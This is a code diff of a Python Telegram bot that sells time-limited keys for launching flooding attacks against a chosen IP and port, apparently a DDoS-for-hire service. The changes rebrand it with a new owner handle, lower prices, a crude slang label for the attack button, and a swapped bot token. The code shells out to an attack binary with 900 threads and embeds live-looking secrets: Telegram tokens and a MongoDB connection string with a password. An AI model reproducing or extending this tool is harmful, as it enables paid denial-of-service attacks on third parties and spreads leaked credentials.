@@ -23,12 +23,12 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 KEY_PRICES = {
-    'hour': 50,  # 50 Rs per hour
-    'day': 150,   # 150 Rs per day
-    'week': 600  # 600 Rs per week
+    'hour': 20,  # 50 Rs per hour
+    'day': 80,   # 150 Rs per day
+    'week': 400  # 600 Rs per week
 }
-ADMIN_IDS = [5912395178,7702119573]
-BOT_TOKEN = "7043201666:AAFfVtpsP24qCmUoroxNwnXCvZhey2uUIx4"
+ADMIN_IDS = [6137106915,7702119573]
+BOT_TOKEN = "7780136598:AAFyh8ZpwzOoOBqS74aB16iUqhUtIdJgLro"
 MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
 thread_count = 900
 packet_size = 9
@@ -342,16 +342,16 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for Kala binary with thread count and packet size
-        command = f"./Kala {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./Razeem {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
-            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
+            f"🚀 Chudai 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
             f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
             f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
             f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
             f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
-            f"᚛ ᚛ @KaliaYtOwner ᚜ ᚜")
+            f"᚛ ᚛ @TGRAZEEM ᚜ ᚜")
 
         # Create and run process without output
         process = await asyncio.create_subprocess_shell(
@@ -365,7 +365,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
 
         # Send completion message
         bot.send_message(chat_id, 
-            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
+            f"Chudai Khatam 🚀")
 
     except Exception as e:
         bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
@@ -402,7 +402,7 @@ def attack_command(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚛ @RTC_CHEATS ᚜*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚛ @TGRAZEEM ᚜*", parse_mode='Markdown')
         return
 
     try:
@@ -598,7 +598,7 @@ def send_welcome(message):
     # Create keyboard markup
     markup = ReplyKeyboardMarkup(resize_keyboard=True)
     my_account_button = KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
-    attack_button = KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
+    attack_button = KeyboardButton("🚀 Chudai")
     markup.add(my_account_button, attack_button)
 
     if is_super_admin(user_id):
@@ -641,7 +641,7 @@ def genkey_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: ᚛ @RTC_CHEATS ᚜*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: ᚛ @TGRAZEEM ᚜*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -649,9 +649,9 @@ def genkey_command(message):
         bot.send_message(chat_id, (
             "*Usage: /genkey <amount> <unit>*\n\n"
             "Available units and prices:\n"
-            "- hour/hours (50₹ per hour)\n"
-            "- day/days (150₹ per day)\n"
-            "- week/weeks (600₹ per week)"
+            "- hour/hours (20₹ per hour)\n"
+            "- day/days (80₹ per day)\n"
+            "- week/weeks (400₹ per week)"
         ), parse_mode='Markdown')
         return
     
@@ -774,7 +774,7 @@ def remove_user_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚛ @RTC_CHEATS ᚜*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚛ @TGRAZEEM ᚜*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -808,7 +808,7 @@ def list_users_command(message):
     else:
         bot.send_message(chat_id, "No users have valid keys.")
 
-@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
+@bot.message_handler(func=lambda message: message.text == "🚀 Chudai")
 def attack_button_handler(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -839,12 +839,12 @@ def attack_button_handler(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @RTC_CHEATS ᚜*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TGRAZEEM ᚜*", parse_mode='Markdown')
         return
 
     valid_until = datetime.fromisoformat(found_user['valid_until'])
     if datetime.now() > valid_until:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @RTC_CHEATS ᚜.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TGRAZEEM ᚜.*", parse_mode='Markdown')
         return
 
     try:
@@ -896,7 +896,7 @@ def my_account(message):
         if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
             account_info = (
                 "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
-                "Contact ᚛ @RTC_CHEATS ᚜ for assistance."
+                "Contact ᚛ @TGRAZEEM ᚜ for assistance."
             )
         else:
             account_info = (
@@ -907,7 +907,7 @@ def my_account(message):
                 f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: {current_time}"
             )
     else:
-        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @RTC_CHEATS ᚜*"
+        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TGRAZEEM ᚜*"
 
     bot.send_message(message.chat.id, account_info)
 
